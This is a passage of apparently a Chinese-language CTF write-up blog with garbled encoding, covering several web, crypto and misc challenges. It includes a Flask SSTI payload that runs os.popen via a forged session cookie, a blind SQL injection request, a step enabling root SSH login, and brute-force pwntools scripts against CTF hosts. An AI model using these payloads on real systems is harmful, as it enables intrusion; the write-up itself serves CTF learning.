class="string">&#x27;b5c1fadbb7e28da08572486d8e6933a84c5144463f178b352c5bda71cff4e8ffe919f0f115a528ebfc4a79b03aea0e31cb22d460ada998c7657d4d0f1be71ffa&#x27;</span></span><br><span class="line"></span><br><span class="line">byte_data = <span class="built_in">bytes</span>.fromhex(hex_string)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line"></span><br><span class="line">decrypted_data = cipher.decrypt(byte_data)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line">s = zlib.decompress(decrypted_data,<span class="number">16</span> + zlib.MAX_WBITS)</span><br><span class="line"></span><br><span class="line">sa= <span class="built_in">str</span>(s)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(sa)</span><br></pre></td></tr></table></figure><p>ubuntu<br>sudoÂ viÂ /etc/ssh/sshd_config</p><p>æŠŠpermitrootlogin prohibit-passwordæ”¹æˆpermitrootlogin yes</p><p>tcp contains â€œusernameâ€ &amp;&amp; tcp contains â€œpasswdâ€</p><p>R-studio</p><p>stikynot.exe snt åç¼€</p><p>tcp contains â€œ{&quot;errcode&quot;:200}â€</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">python .\flask_session_cookie_manager3.py decode -s <span class="string">&quot;ssti_flask_hsfvaldb&quot;</span> -c <span class="string">&quot;.eJwdx1EKwyAMANCrDEGiPz1Ar1KGZBi7gBpplH2Idy_d-3vTDKWrYiGzm2k5vZRUWeo2WsRObkLKeMKeuekoB4RwZvlg1hDg_S917lSeOhAFf0CTRvXp7ytYGPx2EUbnl7drWqqRk11m3cGmKw0.YpIQcw.J5vs8t8bAr0xDIxF6EqUAH2kkLE&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#123;%if session.update(&#123;&#x27;flag&#x27;:lipsum[&#x27;__globals__&#x27;][&#x27;__getitem__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;)%&#125;&#123;%endif%&#125;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python .\flask_session_cookie_manager3.py decode -s <span class="string">&quot;ssti_flask_hsfvaldb&quot;</span> -c <span class="string">&quot;.eJwdylsKAyEMQNGtFEGiUGYBs5VpkRQz04AvjNIPce-t_TyXO9QZ8FK7quQfSd1VF6oJI_3S0HzehEQ4p60Xj43MgPXDHrhIjwc4d4X8wiDOwfNPatwoLhrIAvaAkgulxc87Y2SwWyX0xk6r59CUPJ96qvkFHeUvmg.YpIQkg.65xf8l2g9fXAImkfyihId46KkY4&quot;</span></span><br><span class="line">&#123;<span class="string">&#x27;flag&#x27;</span>: <span class="string">&#x27;red\n&#x27;</span>, <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;&#123;%if session.update(&#123;&#x27;flag&#x27;:lipsum[&#x27;__globals__&#x27;][&#x27;__getitem__&#x27;](&#x27;os&#x27;)[&#x27;popen&#x27;](&#x27;whoami&#x27;).read()&#125;)%&#125;&#123;%endif%&#125;&quot;</span>&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022Space Heroes CTF</title>
      <link href="/2023/08/29/2022Space-Heroes-CTF/"/>
      <url>/2023/08/29/2022Space-Heroes-CTF/</url>
      
        <content type="html"><![CDATA[<h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="R2D2"><a href="#R2D2" class="headerlink" title="R2D2"></a>R2D2</h5><p>æç¤ºrobotæœºå™¨äººï¼Œç›´æ¥è®¿é—®robots.txtå³å¯</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20220403204930418.png" alt="image-20220403204930418"></p><h3 id="Space-Traveler"><a href="#Space-Traveler" class="headerlink" title="Space Traveler"></a>Space Traveler</h3><p>å‰ç«¯éªŒè¯ï¼Œç›´æ¥å³é”®æºä»£ç ï¼Œ</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var _0xb645=[&quot;\x47\x75\x65\x73\x73\x20\x54\x68\x65\x20\x46\x6C\x61\x67&quot;,&quot;\x73\x68\x63\x74\x66\x7B\x66\x6C\x61\x67\x7D&quot;,&quot;\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x72\x69\x67\x68\x74\x2E&quot;,&quot;\x73\x68\x63\x74\x66\x7B\x65\x69\x67\x68\x74\x79\x5F\x73\x65\x76\x65\x6E\x5F\x74\x68\x6F\x75\x73\x61\x6E\x64\x5F\x6D\x69\x6C\x6C\x69\x6F\x6E\x5F\x73\x75\x6E\x73\x7D&quot;,&quot;\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x77\x72\x6F\x6E\x67\x2E&quot;,&quot;\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C&quot;,&quot;\x64\x65\x6D\x6F&quot;,&quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;];function myFunction()&#123;let _0xb729x2;let _0xb729x3=prompt(_0xb645[0],_0xb645[1]);switch(_0xb729x3)&#123;case _0xb645[3]:_0xb729x2= _0xb645[2];break;default:_0xb729x2= _0xb645[4]&#125;;document[_0xb645[7]](_0xb645[6])[_0xb645[5]]= _0xb729x2&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå‡½æ•°æ‹¼æ¥  ä¸ç”¨ç®¡ï¼Œç›´æ¥æŠŠæ‰€æœ‰çš„16è¿›åˆ¶æå‡ºæ¥ï¼Œè§£ä¸€ä¸‹å°±å‡ºäº†.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x47\x75\x65\x73\x73\x20\x54\x68\x65\x20\x46\x6C\x61\x67\x73\x68\x63\x74\x66\x7B\x66\x6C\x61\x67\x7D\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x72\x69\x67\x68\x74\x2E\x73\x68\x63\x74\x66\x7B\x65\x69\x67\x68\x74\x79\x5F\x73\x65\x76\x65\x6E\x5F\x74\x68\x6F\x75\x73\x61\x6E\x64\x5F\x6D\x69\x6C\x6C\x69\x6F\x6E\x5F\x73\x75\x6E\x73\x7D\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x77\x72\x6F\x6E\x67\x2E\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C\x64\x65\x6D\x6F\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64</span><br></pre></td></tr></table></figure><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20220403205401207.png" alt="image-20220403205401207"></p><h4 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h4><h3 id="Khaaaaaan"><a href="#Khaaaaaan" class="headerlink" title="Khaaaaaan!"></a>Khaaaaaan!</h3><p>å¼€å±€ä¸€å¼ å›¾ï¼Œæ˜¯å››ç§å›¾å½¢ç¼–ç </p><p>åˆ†åˆ«å¯¹åº”çš„æ˜¯</p><p><img src="C:\Users\xin\AppData\Roaming\Typora\typora-user-images\image-20220403205525043.png" alt="image-20220403205525043"></p><blockquote><p><a href="https://www.dcode.fr/symbols-ciphers">https://www.dcode.fr/symbols-ciphers</a><br>shctf{without_freedom_of_choice_there_is_no_creativity}</p></blockquote><h3 id="MobileInfantry"><a href="#MobileInfantry" class="headerlink" title="MobileInfantry"></a>MobileInfantry</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># def len_check(pad):</span></span><br><span class="line"><span class="comment">#     if len(pad) != 38:</span></span><br><span class="line"><span class="comment">#         return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 38ä½ï¼Œ</span></span><br><span class="line"><span class="comment"># def check1(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(0, int(len(pad)/2)+1):</span></span><br><span class="line"><span class="comment">#         if not pad[i].isupper():</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"><span class="comment"># isupper():å¤§å†™ï¼Œ1-20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># def check2(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(int(len(pad)/2)+1, len(pad)):</span></span><br><span class="line"><span class="comment">#         if not pad[i].islower():</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># islower():å°å†™ï¼Œ21-38</span></span><br><span class="line"><span class="comment"># def check3(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(0, int(len(pad)/2)):</span></span><br><span class="line"><span class="comment">#         if ord(pad[i]) != ord(pad[i+1])-1:</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"><span class="comment"># 1-19  ABCDEFGHIJKLMNOPQRSTaaaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTUVWXYZ</span></span><br><span class="line"><span class="comment"># zyxwvutsrqponmlkjihgfedcba</span></span><br><span class="line"><span class="comment"># zyxwvutsrqponmlkji</span></span><br><span class="line"><span class="comment"># def check4(pad):</span></span><br><span class="line"><span class="comment">#     for i in range(int(len(pad)/2)+1, len(pad)-1):</span></span><br><span class="line"><span class="comment">#         if ord(pad[i]) != ord(pad[i+1])+1:</span></span><br><span class="line"><span class="comment">#             return False</span></span><br><span class="line"><span class="comment">#     return True</span></span><br><span class="line"><span class="comment"># ABCDEFGHIJKLMNOPQRSTzyxwvutsrqponmlkji</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">strqian = <span class="string">&quot;ABCDEFGHIJKLMNOPQRST&quot;</span></span><br><span class="line">strhou = <span class="string">&quot;zyxwvutsrqponmlkji&quot;</span></span><br><span class="line">listqian = []</span><br><span class="line">listhou = []</span><br><span class="line"><span class="comment">#å¾ªç¯å‡ºæ‰€æœ‰å‰ç¼€listqian</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strqian:</span><br><span class="line">        s = s + <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)+j)</span><br><span class="line">        <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    listqian.append(s)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(listqian)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å¾ªç¯å‡ºæ‰€æœ‰åç¼€listhou</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strhou:</span><br><span class="line">        s = s + <span class="built_in">chr</span>(<span class="built_in">ord</span>(i)-j)</span><br><span class="line">        <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    <span class="comment">#print(&quot;\n&quot;)</span></span><br><span class="line">    listhou.append(s)</span><br><span class="line"><span class="comment">#print(listhou)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        sendstr = listqian[i]+listhou[j]</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            io = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>,<span class="number">27602</span>)</span><br><span class="line">            io.sendline(sendstr)</span><br><span class="line">            a = io.recvall()</span><br><span class="line">            <span class="comment"># io.recvuntil(&quot;[+]&quot;,)</span></span><br><span class="line">            <span class="comment"># a = io.recvuntil(&quot;.&quot;,)</span></span><br><span class="line">            <span class="comment">#print(a.encode())</span></span><br><span class="line">            <span class="comment">#if &quot;&#123;&quot; in str(a) or &quot;&#125;&quot; in str(a):</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(a):</span><br><span class="line">                <span class="built_in">print</span>(sendstr)</span><br><span class="line">                <span class="comment">#io.interactive()</span></span><br><span class="line">                <span class="built_in">print</span>(a)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> misc </tag>
            
            <tag> æ³·å‰‘æ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfwebåˆ·é¢˜è®°å½•</title>
      <link href="/2023/06/14/ctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/06/14/ctfweb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h4 id="é¹¤åŸæ¯-2021-æµé‡åˆ†æ"><a href="#é¹¤åŸæ¯-2021-æµé‡åˆ†æ" class="headerlink" title="[é¹¤åŸæ¯ 2021]æµé‡åˆ†æ"></a>[é¹¤åŸæ¯ 2021]æµé‡åˆ†æ</h4><p>å¼€å±€æ‹¿åˆ°ä¸€ä¸ªæµé‡åŒ…ï¼Œæ˜¯æµé‡åˆ†æï¼Œç»å…¸è€é¢˜ï¼Œ</p><p>ä¸€ä¸ªä¸€ä¸ªæ•°æ˜¾ç„¶å¤ªæ…¢äº†ï¼ŒæŠ„çš„è„šæœ¬ï¼Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># strings timu.pcapng| grep flag &gt; a.txt</span></span><br><span class="line"><span class="comment">#åœ¨kaliä¸­ï¼Œå°†å¸¦æœ‰flagçš„å­—ç¬¦æå‡ºæ¥</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;D:\\vscodework\\ctf\\tjctf\\a.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>)</span><br><span class="line"><span class="comment">#è¯»å–a.txt</span></span><br><span class="line">st = f.read().decode(<span class="string">&quot;utf-8&quot;</span>,<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#GET /ctf/Less-5/?id=1&#x27;%20and%20ascii(substr((select%20flag%20from%20t),1,1))=33--+ HTTP/1.1</span></span><br><span class="line"></span><br><span class="line">lis = re.findall(<span class="string">&quot;,([0-9]*),1\)\)=([0-9]*)&quot;</span>,st)</span><br><span class="line"><span class="comment">#è·å– ä½æ•°å’Œå­—ç¬¦æ•°</span></span><br><span class="line">aa = [<span class="string">&#x27;&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>)]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> lis:</span><br><span class="line">    <span class="comment">#(&#x27;1&#x27;, &#x27;33&#x27;), (&#x27;1&#x27;, &#x27;34&#x27;), (&#x27;1&#x27;, &#x27;35&#x27;), (&#x27;1&#x27;, &#x27;36&#x27;), (&#x27;1&#x27;, &#x27;37&#x27;), </span></span><br><span class="line">    <span class="comment">#å°†æ•°å­—ä¸º1çš„ç´¢å¼•ä¸€ä¸ªä¸ªå¡«å……ï¼Œæ­£å¥½åˆ°æœ€åä¸€ä¸ªï¼Œæ¢ç´¢å¼•</span></span><br><span class="line">    aa[<span class="built_in">int</span>(t[<span class="number">0</span>])] = <span class="built_in">chr</span>(<span class="built_in">int</span>(t[<span class="number">1</span>]))</span><br><span class="line">    <span class="comment">#print(aa)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> aa:</span><br><span class="line">    <span class="built_in">print</span>(i,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">sss  = [(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;33&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;34&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;35&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;36&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;37&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;38&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;39&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;40&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;41&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;42&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;43&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;44&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;45&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;46&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;47&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;48&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;49&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;50&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;51&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;52&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;53&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;54&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;55&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;56&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;57&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;58&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;59&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;60&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;61&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;62&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;63&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;64&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;65&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;66&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;67&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;68&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;69&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;70&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;71&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;72&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;73&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;74&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;75&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;76&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;77&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;78&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;79&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;80&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;81&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;82&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;83&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;84&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;85&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;86&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;87&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;88&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;89&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;90&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;91&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;92&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;93&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;94&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;95&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;96&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;97&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;98&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;99&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;100&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;101&#x27;</span>), (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;102&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;33&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;34&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;35&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;36&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;37&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;38&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;39&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;40&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;41&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;42&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;43&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;44&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;45&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;46&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;47&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;48&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;49&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;50&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;51&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;52&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;53&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;54&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;55&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;56&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;57&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;58&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;59&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;60&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;61&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;62&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;63&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;64&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;65&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;66&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;67&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;68&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;69&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;70&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;71&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;72&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;73&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;74&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;75&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;76&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;77&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;78&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;79&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;80&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;81&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;82&#x27;</span>), (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;83&#x27;</span>), 